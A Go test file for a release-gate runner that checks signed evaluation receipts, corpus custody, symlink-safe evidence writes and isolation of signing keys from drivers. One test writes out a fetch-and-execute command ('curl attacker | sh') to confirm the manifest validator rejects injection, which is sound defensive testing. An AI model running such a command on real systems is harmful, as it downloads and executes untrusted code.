package w2gate

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"
)

const testReleaseCommit = "0123456789abcdef0123456789abcdef01234567"

var testNow = time.Date(2026, 7, 22, 12, 0, 0, 0, time.UTC)

type scriptedExecutor struct {
	mu        sync.Mutex
	authority HMACAuthority
	manifest  Manifest
	now       time.Time
	calls     [][]string
	mutate    func(*Observation)
	wait      bool
	err       error
}

func (executor *scriptedExecutor) Execute(ctx context.Context, _ string, argv []string) ([]byte, error) {
	executor.mu.Lock()
	executor.calls = append(executor.calls, append([]string(nil), argv...))
	executor.mu.Unlock()
	if executor.wait {
		<-ctx.Done()
		return nil, ctx.Err()
	}
	if executor.err != nil {
		return nil, executor.err
	}
	if len(argv) < 6 || argv[0] != "go" || argv[2] != "./cmd/w2-evaluator" {
		return []byte("trusted-check-passed\n"), nil
	}
	gate, ok := executor.manifest.Gate(argv[4])
	if !ok {
		return nil, errors.New("unknown gate")
	}
	observation := passingObservation(gate, executor.authority, executor.now)
	if executor.mutate != nil {
		executor.mutate(&observation)
	}
	return json.Marshal(observation)
}

func TestCheckedManifestIncludesNineGatesAndSixExecutableChecks(t *testing.T) {
	root := filepath.Clean(filepath.Join("..", ".."))
	manifest, digest, err := LoadManifest(filepath.Join(root, "testdata", "w2", "gates.json"))
	if err != nil {
		t.Fatalf("LoadManifest: %v", err)
	}
	if len(manifest.Gates) != len(requiredGateIDs) || len(manifest.Checks) != len(requiredCheckIDs) || !isStrongDigest(digest) {
		t.Fatalf("gates=%d checks=%d digest=%q", len(manifest.Gates), len(manifest.Checks), digest)
	}
	if _, err := manifest.VerifyEvidenceFiles(root); err != nil {
		t.Fatalf("checked collector/price custody: %v", err)
	}
	for _, check := range manifest.Checks {
		if err := check.Validate(); err != nil {
			t.Errorf("check %s: %v", check.ID, err)
		}
		if len(check.Driver.Argv) >= 3 && check.Driver.Argv[0] == "go" && check.Driver.Argv[1] == "run" {
			if _, err := os.Stat(filepath.Join(root, check.Driver.Argv[2])); err != nil {
				t.Errorf("check %s driver is not checked in: %v", check.ID, err)
			}
		}
	}
	for _, gate := range manifest.Gates {
		if gate.RequiredEvidenceMode != EvidenceModeLive {
			t.Errorf("gate %s evidence mode=%q", gate.ID, gate.RequiredEvidenceMode)
		}
		if _, err := LoadCorpus(root, gate, testAuthority()); !errors.Is(err, ErrCorpusNotFrozen) {
			t.Errorf("gate %s pending corpus got %v", gate.ID, err)
		}
		if _, err := os.Stat(filepath.Join(root, gate.Driver.Argv[2])); err != nil {
			t.Errorf("gate %s driver is not checked in: %v", gate.ID, err)
		}
	}
	recall, _ := manifest.Gate("w2d-recall-quality")
	lanes := []string{recall.Baseline.Lane, recall.Candidate.Lane}
	for _, identity := range recall.RecordOnly {
		lanes = append(lanes, identity.Lane)
	}
	if strings.Join(lanes, ",") != "chat,chat,brain,voice,catch_up" {
		t.Fatalf("recall lanes=%v", lanes)
	}
}

func TestRunnerExecutesTrustedDriverRetainsObservationAndSignsReceipt(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	gate, _ := runner.Manifest.Gate(requiredGateIDs[0])
	receipt, outputPath, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit)
	if err != nil {
		t.Fatalf("RunGate: %v", err)
	}
	if len(executor.calls) != 1 || executor.calls[0][0] != "go" || executor.calls[0][2] != "./cmd/w2-evaluator" {
		t.Fatalf("driver not executed exactly once: %v", executor.calls)
	}
	if receipt.Verdict != VerdictPass || !receipt.CandidateCanaryAllowed || receipt.StopTriggered || receipt.HMACSHA256 == "" {
		t.Fatalf("unexpected receipt: %+v", receipt)
	}
	raw, err := os.ReadFile(filepath.Join(runner.Root, receipt.ObservationPath))
	if err != nil {
		t.Fatal(err)
	}
	if digestBytes(raw) != receipt.ObservationDigest {
		t.Fatal("retained observation digest mismatch")
	}
	if _, err := os.Stat(filepath.Join(runner.Root, outputPath)); err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{`"body":`, `"text":`, `"prompt":`, `"transcript":`, `"audio":`} {
		if strings.Contains(string(raw), forbidden) {
			t.Errorf("retained observation contains %s", forbidden)
		}
	}
}

func TestCallerCannotSelfAssertOrForgeObservationAndReceipt(t *testing.T) {
	t.Run("unsigned observation", func(t *testing.T) {
		runner, executor := newFixtureRunner(t)
		executor.mutate = func(observation *Observation) {
			observation.KeyID = "self-signed"
			observation.HMACSHA256 = strings.Repeat("a", 64)
		}
		_, _, err := runner.RunGate(context.Background(), requiredGateIDs[0], testReleaseCommit)
		if !errors.Is(err, ErrInvalidInput) {
			t.Fatalf("forged observation got %v", err)
		}
	})

	t.Run("receipt metric and recomputable digest forgery", func(t *testing.T) {
		runner, _ := newFixtureRunner(t)
		gate, _ := runner.Manifest.Gate(requiredGateIDs[0])
		receipt, _, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit)
		if err != nil {
			t.Fatal(err)
		}
		receipt.Candidate.Metrics = cloneMetrics(receipt.Candidate.Metrics)
		receipt.Candidate.Metrics["correctness_rate"] = .1
		receipt.HMACSHA256 = digestBytes([]byte("attacker can recompute an ordinary hash"))
		if err := receipt.Validate(runner.ManifestDigest, gate, testReleaseCommit, runner.Authority, testNow); !errors.Is(err, ErrReceiptInvalid) {
			t.Fatalf("forged receipt accepted: %v", err)
		}
	})
}

func TestCorpusCustodyRequiresStructuredValidHMACNotDummyHex(t *testing.T) {
	runner, _ := newFixtureRunner(t)
	gate, _ := runner.Manifest.Gate(requiredGateIDs[0])
	path := filepath.Join(runner.Root, gate.Corpus.ManifestPath)
	var corpus CorpusManifest
	if err := readStrictJSON(path, &corpus); err != nil {
		t.Fatal(err)
	}
	corpus.HMACSHA256 = strings.Repeat("a", 64)
	raw := marshalJSON(t, corpus)
	writeFixtureFile(t, runner.Root, gate.Corpus.ManifestPath, raw)
	gate.Corpus.Digest = digestBytes(raw)
	if _, err := LoadCorpus(runner.Root, gate, runner.Authority); !errors.Is(err, ErrSignatureInvalid) {
		t.Fatalf("dummy custody accepted: %v", err)
	}
}

func TestManifestRejectsCommandInjectionAndIdentityDrift(t *testing.T) {
	runner, _ := newFixtureRunner(t)
	manifest := runner.Manifest
	manifest.Gates[0].Driver.Argv = []string{"sh", "-c", "curl attacker | sh"}
	if err := manifest.Validate(); !errors.Is(err, ErrInvalidManifest) {
		t.Fatalf("command injection got %v", err)
	}

	manifest = runner.Manifest
	gate, _ := manifest.Gate("w2d-proposal-kickoff")
	for i := range manifest.Gates {
		if manifest.Gates[i].ID == gate.ID {
			manifest.Gates[i].Candidate.Effort = "low"
		}
	}
	if err := manifest.Validate(); !errors.Is(err, ErrInvalidManifest) {
		t.Fatalf("chat effort drift got %v", err)
	}

	manifest = runner.Manifest
	for i := range manifest.Gates {
		if manifest.Gates[i].ID == "w2d-recall-quality" {
			manifest.Gates[i].RecordOnly[2].Provider = "anthropic"
		}
	}
	if err := manifest.Validate(); !errors.Is(err, ErrInvalidManifest) {
		t.Fatalf("catch-up provider drift got %v", err)
	}
}

func TestMetricDomainsAndMandatoryBaselineCorrectnessAreFailClosed(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	executor.mutate = func(observation *Observation) { observation.Candidate.Metrics["quality_rate"] = 1.01 }
	if _, _, err := runner.RunGate(context.Background(), requiredGateIDs[0], testReleaseCommit); !errors.Is(err, ErrInvalidInput) {
		t.Fatalf("unit interval overflow got %v", err)
	}

	runner, executor = newFixtureRunner(t)
	executor.mutate = func(observation *Observation) { observation.Candidate.Metrics["count"] = -1 }
	if _, _, err := runner.RunGate(context.Background(), requiredGateIDs[0], testReleaseCommit); !errors.Is(err, ErrInvalidInput) {
		t.Fatalf("negative metric got %v", err)
	}

	manifest := runner.Manifest
	manifest.Gates[0].Thresholds = manifest.Gates[0].Thresholds[1:]
	if err := manifest.Validate(); !errors.Is(err, ErrInvalidManifest) {
		t.Fatalf("missing baseline correctness got %v", err)
	}
}

func TestBaselineThresholdFailureBlocksReceiptWithoutTrustedBoolean(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	executor.mutate = func(observation *Observation) { observation.Baseline.Metrics["correctness_rate"] = .5 }
	gate, _ := runner.Manifest.Gate(requiredGateIDs[0])
	_, _, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit)
	if !errors.Is(err, ErrBaselineFailed) {
		t.Fatalf("got %v", err)
	}
	assertReceiptAbsent(t, runner, gate)
}

func TestCandidateThresholdFailureProducesAcceptedBlockingReceipt(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	target := requiredGateIDs[0]
	executor.mutate = func(observation *Observation) {
		if observation.GateID == target {
			observation.Candidate.Metrics["correctness_rate"] = .5
		}
	}
	for _, check := range runner.Manifest.Checks {
		if _, _, err := runner.RunCheck(context.Background(), check.ID, testReleaseCommit); err != nil {
			t.Fatalf("check %s: %v", check.ID, err)
		}
	}
	for _, gate := range runner.Manifest.Gates {
		receipt, _, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit)
		if err != nil {
			t.Fatalf("gate %s: %v", gate.ID, err)
		}
		if gate.ID == target && (receipt.Verdict != VerdictFail || !receipt.W2DAccepted || receipt.CandidateCanaryAllowed || !receipt.StopTriggered) {
			t.Fatalf("candidate-negative receipt=%+v", receipt)
		}
	}
	summary, err := runner.VerifyReceiptSet(testReleaseCommit)
	if err != nil {
		t.Fatal(err)
	}
	if !summary.W2DAccepted || !reflect.DeepEqual(summary.CandidateBlocked, []string{target}) {
		t.Fatalf("candidate-negative summary=%+v", summary)
	}
}

func TestHistoricalReceiptSetDoesNotReapplyObservationChallengeExpiry(t *testing.T) {
	runner, _ := newFixtureRunner(t)
	for _, check := range runner.Manifest.Checks {
		if _, _, err := runner.RunCheck(context.Background(), check.ID, testReleaseCommit); err != nil {
			t.Fatal(err)
		}
	}
	for _, gate := range runner.Manifest.Gates {
		if _, _, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit); err != nil {
			t.Fatal(err)
		}
	}
	runner.Now = func() time.Time { return testNow.Add(48 * time.Hour) }
	if _, err := runner.VerifyReceiptSet(testReleaseCommit); err != nil {
		t.Fatalf("durable receipt set rejected after network challenge expiry: %v", err)
	}
}

func TestEvidenceCustodyRejectsSymlinkComponentsAndFinalTargets(t *testing.T) {
	root := t.TempDir()
	root, err := filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatal(err)
	}
	outside := t.TempDir()
	redirect := filepath.Join(root, "artifacts", "w2-gates")
	if err := os.MkdirAll(filepath.Dir(redirect), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, redirect); err != nil {
		t.Fatal(err)
	}
	redirectedReceipt := filepath.Join(redirect, testReleaseCommit, "receipt.json")
	if err := writeEvidence(redirectedReceipt, []byte(`{"schema":"test"}`)); err == nil {
		t.Fatal("evidence write followed an intermediate symlink")
	}
	if _, err := os.Stat(filepath.Join(outside, testReleaseCommit, "receipt.json")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("redirected evidence escaped custody root: %v", err)
	}

	root = t.TempDir()
	root, err = filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatal(err)
	}
	outside = t.TempDir()
	dir := filepath.Join(root, "artifacts", "w2-gates", testReleaseCommit)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	outsideTarget := filepath.Join(outside, "receipt.json")
	if err := os.WriteFile(outsideTarget, []byte(`{"schema":"outside"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	finalPath := filepath.Join(dir, "receipt.json")
	if err := os.Symlink(outsideTarget, finalPath); err != nil {
		t.Fatal(err)
	}
	if err := writeEvidence(finalPath, []byte(`{"schema":"replacement"}`)); err == nil {
		t.Fatal("evidence write replaced a symlink final target")
	}
	var decoded map[string]any
	if err := readStrictJSON(finalPath, &decoded); err == nil {
		t.Fatal("evidence read followed a symlink final target")
	}
	raw, err := os.ReadFile(outsideTarget)
	if err != nil || string(raw) != `{"schema":"outside"}` {
		t.Fatalf("outside target changed: raw=%q err=%v", raw, err)
	}
}

func TestTimeoutCoversActualDriverExecution(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	executor.wait = true
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	_, _, err := runner.RunGate(ctx, requiredGateIDs[0], testReleaseCommit)
	if err == nil {
		t.Fatal("cancelled execution accepted")
	}
	if len(executor.calls) != 1 {
		t.Fatalf("driver calls=%d", len(executor.calls))
	}
}

func TestRunnerRefusesDifferentCheckoutCommitBeforeDriverExecution(t *testing.T) {
	runner, executor := newFixtureRunner(t)
	runner.ResolveRelease = func(context.Context, string) (string, error) { return strings.Repeat("b", 40), nil }
	_, _, err := runner.RunGate(context.Background(), requiredGateIDs[0], testReleaseCommit)
	if !errors.Is(err, ErrInconclusive) {
		t.Fatalf("checkout mismatch got %v", err)
	}
	if len(executor.calls) != 0 {
		t.Fatalf("driver executed on wrong checkout: %v", executor.calls)
	}
}

func TestRunnerRefusesDirtyUntrackedExecutableInputAtMatchingHead(t *testing.T) {
	root := t.TempDir()
	run := func(arguments ...string) string {
		command := exec.Command("git", arguments...)
		command.Dir = root
		command.Env = append(os.Environ(), "GIT_AUTHOR_NAME=W2 Test", "GIT_AUTHOR_EMAIL=w2@example.invalid", "GIT_COMMITTER_NAME=W2 Test", "GIT_COMMITTER_EMAIL=w2@example.invalid")
		raw, err := command.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v: %s", arguments, err, raw)
		}
		return strings.TrimSpace(string(raw))
	}
	run("init", "-q")
	writeFixtureFile(t, root, "tracked.txt", []byte("release\n"))
	run("add", "tracked.txt")
	run("commit", "-q", "-m", "release")
	release := run("rev-parse", "HEAD")
	if err := os.MkdirAll(filepath.Join(root, "cmd", "w2-evaluator"), 0o700); err != nil {
		t.Fatal(err)
	}
	writeFixtureFile(t, root, "cmd/w2-evaluator/omitted.go", []byte("package main\n"))
	runner := Runner{Root: root}
	if err := runner.assertRelease(context.Background(), release); !errors.Is(err, ErrInconclusive) {
		t.Fatalf("dirty omitted evaluator input accepted: %v", err)
	}
}

func TestOSDriverDoesNotInheritReceiptAuthority(t *testing.T) {
	t.Setenv("BONFIRE_W2D_AUTHORITY_KEY_FILE", "/secret/key")
	t.Setenv("BONFIRE_W2D_AUTHORITY_KEY_ID", "secret-id")
	raw, err := OSDriverExecutor{}.Execute(context.Background(), t.TempDir(), []string{"sh", "-c", `test -z "$BONFIRE_W2D_AUTHORITY_KEY_FILE$BONFIRE_W2D_AUTHORITY_KEY_ID" && printf isolated`})
	if err != nil || string(raw) != "isolated" {
		t.Fatalf("receipt authority leaked to driver: raw=%q err=%v", raw, err)
	}
}

func TestRunCheckAndVerifyCompleteSameCommitReceiptSet(t *testing.T) {
	runner, _ := newFixtureRunner(t)
	for _, check := range runner.Manifest.Checks {
		if _, _, err := runner.RunCheck(context.Background(), check.ID, testReleaseCommit); err != nil {
			t.Fatalf("check %s: %v", check.ID, err)
		}
	}
	for _, gate := range runner.Manifest.Gates {
		if _, _, err := runner.RunGate(context.Background(), gate.ID, testReleaseCommit); err != nil {
			t.Fatalf("gate %s: %v", gate.ID, err)
		}
	}
	summary, err := runner.VerifyReceiptSet(testReleaseCommit)
	if err != nil {
		t.Fatalf("VerifyReceiptSet: %v", err)
	}
	if !summary.W2DAccepted || summary.CheckCount != len(requiredCheckIDs) || summary.ReceiptCount != len(requiredGateIDs) || len(summary.CandidateBlocked) != 0 {
		t.Fatalf("summary=%+v", summary)
	}

	gate := runner.Manifest.Gates[0]
	path := filepath.Join(runner.Root, strings.ReplaceAll(gate.Receipt.OutputPath, "{releaseCommit}", testReleaseCommit))
	var receipt Receipt
	if err := readStrictJSON(path, &receipt); err != nil {
		t.Fatal(err)
	}
	receipt.ReleaseCommit = strings.Repeat("b", 40)
	writeFixtureFile(t, runner.Root, strings.ReplaceAll(gate.Receipt.OutputPath, "{releaseCommit}", testReleaseCommit), marshalJSON(t, receipt))
	if _, err := runner.VerifyReceiptSet(testReleaseCommit); !errors.Is(err, ErrReceiptInvalid) {
		t.Fatalf("cross-commit tamper got %v", err)
	}
}

func TestStrictObservationRejectsBodyAndUnknownFields(t *testing.T) {
	runner, _ := newFixtureRunner(t)
	gate, _ := runner.Manifest.Gate(requiredGateIDs[0])
	raw := marshalJSON(t, passingObservation(gate, runner.Authority, testNow))
	raw = append(bytesWithoutClosingWhitespace(raw), []byte(`,"body":"secret"}`)...)
	if _, err := DecodeObservation(raw); err == nil || !strings.Contains(err.Error(), "unknown field") {
		t.Fatalf("body-bearing observation accepted: %v", err)
	}
}

func newFixtureRunner(t *testing.T) (Runner, *scriptedExecutor) {
	t.Helper()
	t.Setenv("BONFIRE_MEDIA_SOAK_PUBLIC_KEY_FILE", "fixture-soak-public-key.pem")
	t.Setenv("BONFIRE_MEDIA_SOAK_COLLECTOR_PUBLIC_KEY_FILE", "fixture-soak-collector-public-key.pem")
	t.Setenv("BONFIRE_MEDIA_SOAK_RELEASE_PRIVATE_KEY_FILE", "fixture-soak-release-private-key.pem")
	root := t.TempDir()
	var err error
	root, err = filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatal(err)
	}
	authority := testAuthority()
	schemaPath := filepath.Join("testdata", "receipt-schema.json")
	schemaRaw := []byte("{}\n")
	writeFixtureFile(t, root, schemaPath, schemaRaw)
	collectorSourceA := []byte("package fixture\n")
	collectorSourceB := []byte("package fixturecmd\n")
	collectorKey := []byte("collector-public-key-fixture\n")
	priceCatalog := []byte("price-catalog-fixture\n")
	priceKey := []byte("price-public-key-fixture\n")
	writeFixtureFile(t, root, "internal/fixture/collector.go", collectorSourceA)
	writeFixtureFile(t, root, "cmd/fixture-collector/main.go", collectorSourceB)
	writeFixtureFile(t, root, "testdata/collector-public-key.json", collectorKey)
	writeFixtureFile(t, root, "testdata/price-catalog.json", priceCatalog)
	writeFixtureFile(t, root, "testdata/price-public-key.json", priceKey)
	manifest := Manifest{Schema: ManifestSchema, Evidence: EvidenceContract{
		CollectorImplementation: []CheckedFile{{Path: "internal/fixture/collector.go", Digest: digestBytes(collectorSourceA)}, {Path: "cmd/fixture-collector/main.go", Digest: digestBytes(collectorSourceB)}},
		CollectorKey:            Ed25519KeyReference{KeyID: "fixture-collector-key", Path: "testdata/collector-public-key.json", Digest: digestBytes(collectorKey)},
		PriceCatalog:            CheckedFile{Path: "testdata/price-catalog.json", Digest: digestBytes(priceCatalog)},
		PriceKey:                Ed25519KeyReference{KeyID: "fixture-price-key", Path: "testdata/price-public-key.json", Digest: digestBytes(priceKey)},
	}}
	for _, id := range requiredCheckIDs {
		manifest.Checks = append(manifest.Checks, IntegratedCheckDefinition{ID: id, Description: "fixture integrated check", Driver: DriverSpec{ID: id, Argv: fixtureCheckArgv(id)}, TimeoutSeconds: 1, ReceiptPath: filepath.Join("artifacts", "w2-gates", "{releaseCommit}", "checks", id+".json")})
	}
	for _, id := range requiredGateIDs {
		corpusPath := filepath.Join("testdata", "corpora", id+".json")
		items := []string{digestBytes([]byte(id + ":item:1"))}
		corpus := CorpusManifest{Schema: CorpusSchema, GateID: id, Status: "frozen", BodyIncluded: false, ItemCount: 1, ItemDigests: items,
			Custody: CorpusCustody{Authority: "bonfire-eval-custodian", Controller: "bonfire-security", SourceSystem: "encrypted-eval-vault", ExportID: "export-" + id, SourceHighWater: "capture-100", ExportedAt: testNow.Add(-time.Hour), DeletedAt: testNow.Add(-time.Minute), ItemMerkleRoot: digestStrings(items)}}
		if err := corpus.Sign(authority); err != nil {
			t.Fatal(err)
		}
		corpusRaw := marshalJSON(t, corpus)
		writeFixtureFile(t, root, corpusPath, corpusRaw)
		base, candidate, records := fixtureIdentities(id)
		baselineBar, candidateBar := .9, .9
		gate := GateDefinition{ID: id, Description: "fixture domain gate", Corpus: CorpusReference{ManifestPath: corpusPath, Digest: digestBytes(corpusRaw), MinimumItems: 1}, TimeoutSeconds: 1,
			Thresholds:    []MetricThreshold{{ID: "baseline-correctness", Snapshot: "baseline", Metric: "correctness_rate", Operator: "gte", Value: &baselineBar}, {ID: "candidate-correctness", Snapshot: "candidate", Metric: "correctness_rate", Operator: "gte", Value: &candidateBar}},
			Receipt:       ReceiptSpecification{OutputPath: filepath.Join("artifacts", "w2-gates", "{releaseCommit}", id+".json"), Schema: ReceiptSchema, SchemaPath: schemaPath, SchemaDigest: digestBytes(schemaRaw)},
			ReleaseCommit: "${BONFIRE_RELEASE_COMMIT}", FeatureFlag: strings.ToUpper(strings.ReplaceAll(id, "-", "_")) + "_CANARY", StopCondition: "candidate correctness regression", RollbackCommand: "unset " + strings.ToUpper(strings.ReplaceAll(id, "-", "_")) + "_CANARY", Baseline: base, Candidate: candidate, RecordOnly: records, RequiredEvidenceMode: EvidenceModeFixture}
		gate.Driver = DriverSpec{ID: "bonfire-w2-evaluator-v1", Argv: []string{"go", "run", "./cmd/w2-evaluator", "--gate", id, "--corpus-manifest", corpusPath, "--release-commit", "{releaseCommit}"}}
		manifest.Gates = append(manifest.Gates, gate)
	}
	manifestRaw := marshalJSON(t, manifest)
	manifestPath := filepath.Join(root, "testdata", "gates.json")
	writeFixtureFile(t, root, filepath.Join("testdata", "gates.json"), manifestRaw)
	loaded, digest, err := LoadManifest(manifestPath)
	if err != nil {
		t.Fatalf("fixture manifest: %v", err)
	}
	executor := &scriptedExecutor{authority: authority, manifest: loaded, now: testNow}
	runner := Runner{Root: root, Manifest: loaded, ManifestDigest: digest, Authority: authority, Executor: executor, ResolveRelease: func(context.Context, string) (string, error) { return testReleaseCommit, nil }, Now: func() time.Time { return testNow }}
	return runner, executor
}

func fixtureIdentities(id string) (EvaluationIdentity, EvaluationIdentity, []EvaluationIdentity) {
	lane, provider, model, effort := "retrieval", "openai", "fixture-model", "low"
	switch id {
	case "w2d-stt-fidelity":
		lane, provider, model, effort = "transcription", "openai", "gpt-4o-transcribe", "no_reasoning"
	case "w2d-brain-commitments", "w2d-brain-fleet-parity":
		lane, provider, model, effort = "brain", "openai", "gpt-5.5", "low"
	case "w2d-proposal-kickoff":
		lane, provider, model, effort = "chat", "anthropic", "claude-sonnet-5", "medium"
	case "w2d-recall-quality":
		base := EvaluationIdentity{ID: id + "-baseline", Lane: "chat", Provider: "anthropic", Model: "claude-sonnet-5", Effort: "medium"}
		candidate := EvaluationIdentity{ID: id + "-candidate", Lane: "chat", Provider: "anthropic", Model: "claude-sonnet-5", Effort: "medium"}
		records := []EvaluationIdentity{{ID: "brain-recall", Lane: "brain", Provider: "openai", Model: "gpt-5.5", Effort: "low"}, {ID: "voice-recall", Lane: "voice", Provider: "anthropic", Model: "claude-sonnet-5", Effort: "low"}, {ID: "catch-up-recall", Lane: "catch_up", Provider: "openai", Model: "gpt-5.5", Effort: "low"}}
		return base, candidate, records
	case "w2d-board-fidelity":
		lane = "board"
	case "w2d-realtime-voice":
		lane, model = "voice", "gpt-realtime-2"
	case "w2d-review-shadow":
		lane, provider, model, effort = "review", "anthropic", "claude-opus-4-8", "high"
	case "w2d-embedding-retrieval":
		lane, provider, model, effort = "retrieval", "bonfire", "lexical-retrieval", "deterministic"
	}
	base := EvaluationIdentity{ID: id + "-baseline", Lane: lane, Provider: provider, Model: model, Effort: effort}
	candidate := base
	candidate.ID = id + "-candidate"
	return base, candidate, nil
}

func fixtureCheckArgv(id string) []string {
	switch id {
	case "integrated-normal":
		return []string{"go", "test", "-count=1", "./..."}
	case "consolidated-race":
		return []string{"go", "test", "-race", "-count=1", ".", "./internal/w2gate", "./internal/mediasoak"}
	case "migration-replay":
		return []string{"go", "test", "-count=1", ".", "-run", "Test(CanonicalMigration|ProductionCatchUp|MeetingMemoryBrainAdapter|ExactCatchUp)"}
	case "two-room-live-soak":
		return []string{"go", "run", "./cmd/media-soak", "--collect", "--manifest", "testdata/w2a/media-soak.json", "--public-key-file", "{env:BONFIRE_MEDIA_SOAK_PUBLIC_KEY_FILE}", "--collector-public-key-file", "{env:BONFIRE_MEDIA_SOAK_COLLECTOR_PUBLIC_KEY_FILE}", "--release-private-key-file", "{env:BONFIRE_MEDIA_SOAK_RELEASE_PRIVATE_KEY_FILE}", "--release-commit", "{releaseCommit}"}
	case "production-recall-replay":
		return []string{"go", "run", "./cmd/w2-recall-replay", "--release-commit", "{releaseCommit}"}
	default:
		return []string{"go", "run", "./cmd/w2-workflow-pilot", "--workflow", "insights-opportunities", "--release-commit", "{releaseCommit}"}
	}
}

func passingObservation(gate GateDefinition, authority HMACAuthority, now time.Time) Observation {
	observation := Observation{Schema: ObservationSchema, GateID: gate.ID, ReleaseCommit: testReleaseCommit, CorpusDigest: gate.Corpus.Digest, EvidenceMode: gate.RequiredEvidenceMode, IssuedAt: now, ExpiresAt: now.Add(30 * time.Minute),
		Run:           RunEvidence{ID: "run-" + strings.ReplaceAll(gate.ID, "_", "-"), DriverID: gate.Driver.ID, DriverArgvDigest: driverArgvDigest(gate.Driver.Argv, testReleaseCommit), StartedAt: now, CompletedAt: now},
		CorpusCustody: CorpusCustodyProof{ManifestDigest: gate.Corpus.Digest, Authority: "bonfire-eval-custodian", ExportID: "export-" + gate.ID, ItemMerkleRoot: digestStrings([]string{digestBytes([]byte(gate.ID + ":item:1"))})},
		Baseline:      passingSnapshot(gate.Baseline, now), Candidate: passingSnapshot(gate.Candidate, now)}
	for _, identity := range gate.RecordOnly {
		observation.RecordOnly = append(observation.RecordOnly, passingSnapshot(identity, now))
	}
	return observation
}

func passingSnapshot(identity EvaluationIdentity, now time.Time) EvaluationSnapshot {
	return EvaluationSnapshot{Identity: identity, Metrics: map[string]float64{"correctness_rate": 1, "quality_rate": 1, "count": 1}, EvidenceDigest: digestBytes([]byte(identity.ID + ":evidence")), Cost: CostSnapshot{Currency: "USD", EstimatedUSD: .01, InputTokens: 10, CachedInputTokens: 2, OutputTokens: 5, AudioSeconds: 0, Price: PriceEvidence{Catalog: "provider-price-catalog", Version: "2026-07-22", RetrievedAt: now, Digest: digestBytes([]byte(identity.ID + ":price"))}}}
}
func testAuthority() HMACAuthority {
	return HMACAuthority{KeyID: "bonfire-w2-test-v1", Key: []byte("0123456789abcdef0123456789abcdef")}
}
func cloneMetrics(metrics map[string]float64) map[string]float64 {
	cloned := map[string]float64{}
	for key, value := range metrics {
		cloned[key] = value
	}
	return cloned
}
func assertReceiptAbsent(t *testing.T, runner Runner, gate GateDefinition) {
	t.Helper()
	path := strings.ReplaceAll(gate.Receipt.OutputPath, "{releaseCommit}", testReleaseCommit)
	if _, err := os.Stat(filepath.Join(runner.Root, path)); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("receipt should be absent: %v", err)
	}
}
func writeFixtureFile(t *testing.T, root, relative string, raw []byte) {
	t.Helper()
	path := filepath.Join(root, relative)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, raw, 0o600); err != nil {
		t.Fatal(err)
	}
}
func marshalJSON(t *testing.T, value any) []byte {
	t.Helper()
	raw, err := json.MarshalIndent(value, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	return append(raw, '\n')
}
func bytesWithoutClosingWhitespace(raw []byte) []byte {
	trimmed := strings.TrimSpace(string(raw))
	return []byte(strings.TrimSuffix(trimmed, "}"))
}

var _ = fmt.Sprintf
